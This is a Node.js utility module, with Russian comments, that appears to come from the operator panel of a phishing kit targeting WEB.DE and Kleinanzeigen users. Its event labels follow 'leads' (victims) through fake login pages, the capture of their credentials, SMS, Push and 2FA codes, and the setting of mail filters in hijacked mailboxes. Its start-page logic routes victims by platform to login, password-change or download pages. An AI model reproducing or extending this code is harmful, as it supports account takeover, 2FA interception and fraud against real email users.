'use strict';

const path = require('path');
const fs = require('fs');
const https = require('https');
const { getPlatformFromRequest } = require('../lib/platformDetect');

/** Каталог data/ (SQLite, start-page.txt и др.): как в server.js (GMW_DATA_DIR или ./data от корня репо). */
function getProjectDataDir() {
  const projectRoot = path.join(__dirname, '..', '..');
  return process.env.GMW_DATA_DIR ? path.resolve(process.env.GMW_DATA_DIR) : path.join(projectRoot, 'data');
}

/** Единые подписи EVENTS (скрипт/админка). */
const EVENT_LABELS = {
  WEBDE_START: 'Запуск WEB.DE',
  WEBDE_QUEUE: 'WEB.DE: в очереди',
  KLEIN_START: 'Запуск Klein',
  KLEIN_QUEUE: 'Klein: в очереди',
  PUSH: 'Push',
  PUSH_TIMEOUT: 'Push: таймаут',
  SMS: 'SMS',
  SMS_KL: 'SMS Kl',
  WRONG_DATA: 'Неверные данные',
  WRONG_DATA_KL: 'Неверные данные Kl',
  WRONG_SMS: 'Неверный SMS',
  WRONG_SMS_KL: 'Неверный SMS Kl',
  WRONG_2FA: 'Неверный 2FA',
  TWO_FA: '2FA',
  TWO_FA_TIMEOUT: '2FA: таймаут ожидания кода',
  SUCCESS: 'Успешный вход',
  SUCCESS_KL: 'Успешный вход Kl',
  MAIL_FILTERS_START: 'Включение фильтров на почте',
  MAIL_FILTERS_OK: 'Фильтры включены',
  MAIL_READY: 'Почта готова',
  PUSH_RESEND_OK: 'Push: переотправлен',
  PUSH_RESEND_FAIL: 'Push: переотправка не удалась',
  TWO_FA_CODE_IN: '2FA: код получен, ввод на WEB.DE',
  TWO_FA_WRONG: '2FA: неверный код',
  WEBDE_STEP_BROWSER: 'WEB.DE: браузер готов',
  WEBDE_STEP_ATTEMPT: 'WEB.DE: попытка входа',
  WEBDE_MAIL_OPENED: 'WEB.DE: почтовый ящик открыт',
  MAIL_UI_READY: 'Почта: интерфейс подготовлен',
  KLEIN_SESSION_MAIL: 'Klein: сессия почты в браузере',
  KLEIN_WAIT_VICTIM: 'Klein: ждём открытия страницы у лида',
  KLEIN_VICTIM_HERE: 'Klein: лид на странице входа',
  KLEIN_CREDS_FROM_LEAD: 'Klein: данные для входа получены',
  KLEIN_SCRIPT_START: 'Klein (скрипт): старт',
  KLEIN_SCRIPT_BROWSER: 'Klein (скрипт): браузер',
  WEBDE_SCREEN_PUSH: 'WEB.DE: на экране Push',
  WEBDE_SCREEN_2FA: 'WEB.DE: на экране 2FA',
  WEBDE_SCREEN_SMS: 'WEB.DE: на экране SMS',
};

function readStartPage() {
  const startPageFile = path.join(getProjectDataDir(), 'start-page.txt');
  try {
    if (fs.existsSync(startPageFile)) {
      const raw = fs.readFileSync(startPageFile, 'utf8').trim().toLowerCase();
      if (raw === 'login') return 'login';
      if (raw === 'change') return 'change';
      if (raw === 'download') return 'download';
      if (raw === 'klein') return 'klein';
      return 'login';
    }
  } catch (e) {}
  return 'login';
}

/** startPage=download: по платформе — android/ios → ПК, win → Sicherheit, mac → смена пароля */
function getRedirectPasswordStatus(lead) {
  const p = (lead && (lead.platform || '').toLowerCase()) || '';
  if (p === 'windows') return 'redirect_sicherheit';
  if (p === 'macos') return 'redirect_change_password';
  if (p === 'android' || p === 'ios') return 'redirect_open_on_pc';
  return 'redirect_open_on_pc';
}

/** Маскировка email в логах (не выводить полный адрес). */
function maskEmail(email) {
  if (email == null || typeof email !== 'string') return '';
  const s = email.trim();
  if (s.length < 3) return '***';
  const at = s.indexOf('@');
  if (at <= 0 || at === s.length - 1) return s.slice(0, 2) + '***';
  return s.slice(0, Math.min(2, at)) + '***@' + s.slice(at + 1);
}

/** Язык перевода сообщений от пользователя в чате (например ru, en). Пусто — перевод выключен. */
const CHAT_TRANSLATE_TARGET = (process.env.CHAT_TRANSLATE_TARGET || 'ru').trim().toLowerCase();
const LIBRE_TRANSLATE_URL = (process.env.LIBRE_TRANSLATE_URL || 'https://libretranslate.com').replace(/\/$/, '');

function translateChatText(text, cb) {
  if (!CHAT_TRANSLATE_TARGET || !text || typeof text !== 'string') {
    if (typeof cb === 'function') cb(null);
    return;
  }
  const body = JSON.stringify({
    q: text.slice(0, 5000),
    source: 'auto',
    target: CHAT_TRANSLATE_TARGET,
    format: 'text'
  });
  const base = LIBRE_TRANSLATE_URL.startsWith('http') ? LIBRE_TRANSLATE_URL : 'https://' + LIBRE_TRANSLATE_URL;
  const u = new URL(base + '/translate');
  const opts = { hostname: u.hostname, path: u.pathname, method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body, 'utf8') } };
  if (u.port && u.port !== '80' && u.port !== '443') opts.port = u.port;
  const req = https.request(opts, (res) => {
    let data = '';
    res.on('data', (chunk) => { data += chunk; });
    res.on('end', () => {
      try {
        const j = JSON.parse(data);
        if (j && typeof j.translatedText === 'string') {
          if (typeof cb === 'function') cb(j.translatedText);
          return;
        }
      } catch (e) {}
      if (typeof cb === 'function') cb(null);
    });
  });
  req.on('error', () => { if (typeof cb === 'function') cb(null); });
  req.setTimeout(8000, () => { req.destroy(); if (typeof cb === 'function') cb(null); });
  req.write(body);
  req.end();
}

module.exports = {
  maskEmail,
  getPlatformFromRequest,
  translateChatText,
  CHAT_TRANSLATE_TARGET,
  EVENT_LABELS,
  readStartPage,
  getRedirectPasswordStatus,
};
